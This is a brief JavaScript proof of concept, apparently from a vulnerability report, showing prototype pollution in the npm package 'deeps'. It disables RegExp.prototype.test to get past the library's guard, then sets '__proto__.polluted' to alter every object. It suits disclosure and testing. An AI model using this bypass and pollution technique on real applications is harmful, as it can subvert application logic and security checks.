RegExp.prototype.test = () => false;
console.log({}.polluted);
const deeps = require('deeps');
deeps.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);